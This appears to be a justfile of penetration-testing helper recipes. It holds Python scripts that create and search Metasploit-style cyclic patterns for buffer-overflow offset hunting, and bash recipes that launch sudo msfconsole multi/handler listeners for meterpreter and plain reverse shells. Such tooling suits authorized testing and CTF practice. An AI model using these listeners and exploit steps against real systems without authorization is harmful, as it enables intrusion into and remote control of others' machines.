# Cyclic pattern for offset hunting (msf-pattern_create)
[group('security')]
pattern length:
    #!/usr/bin/env python3
    import string, sys
    want = int("{{`{{ length }}`}}")
    pat = "".join(
        u + l + d
        for u in string.ascii_uppercase
        for l in string.ascii_lowercase
        for d in string.digits
    )
    if want > len(pat):
        sys.exit("pattern: max length is %d" % len(pat))
    print(pat[:want])

# Find where a crash value lands in that pattern (msf-pattern_offset)
# Takes ASCII "Aa0B" or a little-endian register dump like 0x41326641
[group('security')]
offset value:
    #!/usr/bin/env python3
    import string, sys
    raw = "{{`{{ value }}`}}"
    if raw.lower().startswith("0x"):
        needle = bytes.fromhex(raw[2:])[::-1].decode("latin-1")
    else:
        needle = raw
    pat = "".join(
        u + l + d
        for u in string.ascii_uppercase
        for l in string.ascii_lowercase
        for d in string.digits
    )
    at = pat.find(needle)
    if at < 0:
        sys.exit("offset: %r is not in the pattern" % needle)
    print("%s found at offset %d" % (needle, at))

# Start a multihandler for a meterpreter reverse shell
[group('security')]
revmeter os iface port:
    #!/bin/env bash
    {{`{{ msfcheck }}`}}
    if [[ "{{`{{os}}`}}" == "windows" ]]; then
        export LHOST={{`{{iface}}`}}
        export LPORT={{`{{port}}`}}
        sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
        unset LHOST LPORT
    elif [[ "{{`{{os}}`}}" == "linux" ]]; then
        export LHOST={{`{{iface}}`}}
        export LPORT={{`{{port}}`}}
        sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
        unset LHOST LPORT
    else
        echo "Unsupported OS: {{`{{os}}"`}}
        exit 1
    fi

# Start a multihandler for a regular reverse shell
[group('security')]
rev os iface port:
    #!/bin/env bash
    {{`{{ msfcheck }}`}}
    if [[ "{{`{{os}}`}}" == "windows" ]]; then
        export LHOST={{`{{iface}}`}}
        export LPORT={{`{{port}}`}}
        sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
        unset LHOST LPORT
    elif [[ "{{`{{os}}`}}" == "linux" ]]; then
        export LHOST={{`{{iface}}`}}
        export LPORT={{`{{port}}`}}
        sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
        unset LHOST LPORT
    else
        echo "Unsupported OS: {{`{{os}}`}}"
        exit 1
    fi
